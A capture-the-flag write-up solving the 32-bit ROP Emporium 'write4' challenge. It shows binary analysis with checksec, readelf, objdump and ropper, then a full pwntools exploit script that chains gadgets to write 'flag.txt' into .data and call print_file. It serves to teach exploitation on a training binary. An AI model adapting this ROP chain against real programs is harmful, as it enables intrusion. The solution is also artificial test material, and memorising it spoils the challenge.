# write4 - 32 Bit
Program execution:
```
write4 by ROP Emporium
x86

Go ahead and give me the input already!

> <input_here>
```
Run checksec: `checksec ./write432`
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Again, `main` call `pwnme`, but this time `pwnme` is in an external file, which must be the given libwrite432.so.

Disassembling libwrite432.so shows that just like in the past challenges, `pwnme` unsafely reads too many (0x200) bytes in to a 32 byte buffer at `ebp-0x28`:
```assembly
sub     esp, 0x4
push    0x200 {var_34}
lea     eax, [ebp-0x28 {var_2c}]
push    eax {var_2c} {var_38}
push    0x0
call    read
```

We also find the implementation of a `print_file` function which was in the binary's GOT:
```c
int32_t print_file(int32_t arg1)

00000775  int32_t eax = fopen(arg1, data_84b)
000007b1  if (eax != 0)
000007b1      void var_31
000007b1      fgets(&var_31, 0x21, eax)
000007c0      puts(&var_31)
000007e2      return fclose(eax)
00000793  printf("Failed to open file: %s\n", arg1)
000007a0  exit(status: 1)
000007a0  noreturn
```

This function will print a file specified by the string argument (address). So we want to pass "flag.txt" into this function.
Running `rabin2 -z write432` reveals that there is no flag.txt string:
```
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000005d0 0x080485d0 11  12   .rodata ascii nonexistent
```
This means we will need to store a "flag.txt" string somewhere where we know the address (so stack won't work). This area of memory will also need to be writeable. We can use `readelf` to view a list of program segments and their accessibility flags.
`readelf -S write432`:
```
There are 30 section headers, starting at offset 0x17a4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00003c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481e8 0001e8 0000b0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048298 000298 00008b 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048324 000324 000016 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         0804833c 00033c 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             0804835c 00035c 000008 08   A  5   0  4
  [10] .rel.plt          REL             08048364 000364 000018 08  AI  5  23  4
  [11] .init             PROGBITS        0804837c 00037c 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483a0 0003a0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 08  AX  0   0  8
  [14] .text             PROGBITS        080483f0 0003f0 0001c2 00  AX  0   0 16
  [15] .fini             PROGBITS        080485b4 0005b4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080485c8 0005c8 000014 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        080485dc 0005dc 000044 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048620 000620 000114 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
  [28] .strtab           STRTAB          00000000 00148c 000211 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 00169d 000105 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```
We're interested in the sections with the `W` flag (writable). `.data` is as good as any and putting data there is the least likely to cause issues. To be safe we can use `objdump` to view a hexdump of that section and confirm there is no important data we are at risk of overwriting:
`objdump -s -j .data write432`:
```
write432:     file format elf32-i386

Contents of section .data:
 804a018 00000000 00000000
```
So we know we need to write "flag.txt" to .data, but what ROP gadgets can we use to achieve that? We need to find `mov` gadgets that work with memory address (`[reg]` notation).
`ropper -f write432 --search 'mov [???], ???'`:
```
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov [???], ???

[INFO] File: write432
0x08048543: mov dword ptr [edi], ebp; ret;
```
So we have 1 gadgets that lets us move the value in `ebp` into the address specified by the value of `edi`. So now we need gadgets to pop data off the stack into `ebp` and `edi`
`ropper -f write432 --search 'pop edi; pop ebp;'`:
```
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop edi; pop ebp;

[INFO] File: write432
0x080485aa: pop edi; pop ebp; ret;
```
Coincidentally we have a gadget that will let us do that exactly.
Since we can only move 4 bytes at a time, we will have to do 3 moves. One for "flag", one for ".txt" and one for "\x00\x00\x00\x00" so that our string ends with a null terminator.
Each time we write 4 bytes, remember we need to offset the .data address to write to, by 4.

Exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./write432"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
	gdb.attach(p, '''break main''')

data_addr = 0x0804a018
mov_ptr_edi_ebp_addr = 0x08048543
pop_edi_ebp_addr = 0x080485aa

p.recvuntil(b'> ')

payload = b'A' * (0x28 + 0x4)

for i, string in enumerate([b'flag', b'.txt', b'\x00'*4]):
	# build our string, 4 bytes at a time
	payload += p32(pop_edi_ebp_addr)
	payload += p32(data_addr + i*4)
	payload += string
	payload += p32(mov_ptr_edi_ebp_addr)

# with our .data set up, we can call print_file
payload += p32(elf.symbols['print_file'])
payload += b'A' * 4
payload += p32(data_addr)

p.sendline(payload)

p.interactive()
```

And we get the flag:
```
Thank you!
ROPE{a_placeholder_32byte_flag!}
```